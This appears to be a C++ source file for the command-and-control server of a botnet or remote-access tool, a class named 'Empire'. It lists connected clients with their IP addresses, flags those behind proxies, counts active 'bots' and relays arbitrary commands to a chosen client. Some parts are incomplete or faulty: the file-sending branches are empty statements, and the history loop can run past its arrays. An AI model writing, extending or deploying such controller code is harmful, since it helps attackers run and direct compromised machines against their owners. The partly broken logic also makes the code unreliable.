#include "../../include/server/server.h"
#include <vector>

std::vector<std::string> split(std::string s, std::string delimiter) {
    size_t pos_start = 0, pos_end, delim_len = delimiter.length();
    std::string token;
    std::vector<std::string> res;

    while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos) {
        token = s.substr (pos_start, pos_end - pos_start);
        pos_start = pos_end + delim_len;
        res.push_back (token);
    }

    res.push_back (s.substr (pos_start));
    return res;
}

Empire::Empire() {}
Empire::Empire(server_t& server, handler_t& handler) {
    SocketServerEmpire  = server;
    SocketListenHandler = handler;
}

Empire::Empire(server_t& server, handler_t& handler, const string_t& cdl) {
    SocketServerEmpire  =  server;
    SocketListenHandler = handler;
    CommandDeskList     = cdl;
}

const uint16_t Empire::GetServerPort()    { return SocketServerEmpire.getPort(); }
const uint32_t Empire::GetServerAddress() { return 0x00000000; }
const uint32_t Empire::GetClientAddress(const string_t CID) {
    uint32_t clientHost = 0;

    if (!SocketServerEmpire.getCID().size())
        return 0x00000000;

    for (uint32_t i = 0; i < SocketServerEmpire.getCID().size(); i++)
        if (SocketServerEmpire.getCID()[i] == CID)
            clientHost = SocketServerEmpire.getClients()[i].host;

    return clientHost;
}

const Empire::string_t Empire::GetCDL() { return CommandDeskList; }

Empire::string_t Empire::Addr2String(const uint32_t address) {
    __sstream_t ip_str;

    ip_str << (address & 0xff)         << ".";
    ip_str << ((address >> 8)  & 0xff) << ".";
    ip_str << ((address >> 16) & 0xff) << ".";
    ip_str << ((address >> 24) & 0xff);

    return ip_str.str();
}

Empire::string_t Empire::ServerHandler(const string_t& command) {
    vstring_t split_command = split(command, "/");

    if (split_command[0] == "$GetClients") {
        __sstream_t sstream;

        vstring_t CID;
        client_t  clients;

        if (SocketServerEmpire.getCID().size() > 0) {
            CID     = SocketServerEmpire.getCID();
            clients = SocketServerEmpire.getClients();
        }

        if (CID.size() != clients.size())
            return "List broken";

        else {
            for (uint32_t i = 0; i < CID.size(); i++) {
                if (clients[i].proxy_hint)
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CID[i].data() << " - proxy_hint_detected" << std::endl
                            << "ClientAddress: " << clients[i].host << std::endl;

                else
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CID[i].data()   << std::endl
                            << "ClientAddress: " << clients[i].host << std::endl;
            }
        }

        return sstream.str();
    }

    if (split_command[0] == "$GetHistory") {
        vstring_t     CID = SocketServerEmpire.getCID();
        client_t  clients;

        if (CID.size() > 0)
            clients = SocketServerEmpire.getClients();

        if (CID.size() != CHDB.size()) {
            for (uint32_t i = 0; i < CID.size(); i++) {
                if (CID[i] == CHDB[i])
                    CHDBC[i] = clients[i];

                else {
                     CHDB.push_back(CID[i]);
                    CHDBC.push_back(clients[i]);
                }
            }
        }

        else {
            CHDB  = CID;
            CHDBC = clients;
        }

        __sstream_t sstream;

        for (uint32_t i = 0; i < CHDB.size(); i++) {
            if (CHDBC[i].proxy_hint) {
                if (CHDBC[i].is_online)
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CHDB[i].data() << " - proxy_hint_detected" << std::endl
                            << "ClientAddress: " << CHDBC[i].host  << " - [ONLINE]"            << std::endl;

                else
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CHDB[i].data() << " - proxy_hint_detected" << std::endl
                            << "ClientAddress: " << CHDBC[i].host  << " - [DISCONNECTED]"      << std::endl;
            }

            else {
                if (CHDBC[i].is_online)
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CHDB[i].data() << std::endl
                            << "ClientAddress: " << CHDBC[i].host  << " - [ONLINE]"            << std::endl;

                else
                    sstream << "_______________" << std::endl
                            << "ClientId: "      << CHDB[i].data() << std::endl
                            << "ClientAddress: " << CHDBC[i].host  << " - [DISCONNECTED]"      << std::endl;
            }
        }

        return sstream.str();
    }

    if (split_command[0] == "$GetCID") {
        vstring_t CID = SocketServerEmpire.getCID();

        __sstream_t sstream;

        for (const auto& ClientID: CID)
            sstream << "_______________" << std::endl
                    << ClientID          << std::endl;

        return sstream.str();
    }

    if (split_command[0] == "$Check") {
        uint32_t check = SocketServerEmpire.checkBot();

        __sstream_t sstream;

        sstream << "Active clients: " << check << std::endl;

        return sstream.str();
    }

    if (split_command[0] == "$Send") {
        string_t CID      = split_command[2];
        string_t send_cmd = split_command[1];

        bool check_CID_error = false;

        __sstream_t sstream;

        for (uint32_t i = 0, t = 0; i < SocketServerEmpire.getCID().size(); i++) {
            if (CID != SocketServerEmpire.getCID()[i]) t++;

            if ((t == i) && (SocketServerEmpire.getCID()[i] != CID))
                check_CID_error = true;
        }

        if (check_CID_error)
            return "Check CID error";

        if (!SocketServerEmpire.sendBy(CID, send_cmd))
            return "Send error";

        else
            return "Message delivered";
    }

    if (split_command[0] == "$SendFile");
    if (split_command[0] == "$SendFileAll");

    return ("");
}

Empire::~Empire() {
    SocketServerEmpire.disconnectAll();
    SocketServerEmpire.removeAll();
}

Empire::void_t Empire::SetServerPort(const uint16_t port) {
    SocketServerEmpire.setPort(port);
}

Empire::void_t Empire::SetHandler(handler_t& handler) {
    SocketListenHandler = handler;
}

Empire::void_t Empire::SetServer(server_t& server) {
    SocketServerEmpire = server;
}

Empire::void_t Empire::SetCDL(const string_t& cdl) {
    CommandDeskList = cdl;
}

Empire::void_t Empire::SetCHandlerList(client_handler_t& chandler) {
    CHandlerList = chandler;
}